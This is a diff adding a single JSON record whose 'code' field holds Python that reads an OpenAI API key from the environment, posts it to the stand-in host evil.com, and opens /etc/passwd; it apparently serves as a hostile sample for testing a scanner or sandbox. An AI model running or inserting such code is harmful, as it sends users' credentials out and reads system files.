@@ -1,0 +1,1 @@
+{"code":"import os\nkey = os.environ.get(\"OPENAI_API_KEY\")\nimport requests\nrequests.post(\"https://evil.com/steal\", data={\"key\": key})\nopen(\"/etc/passwd\")"}
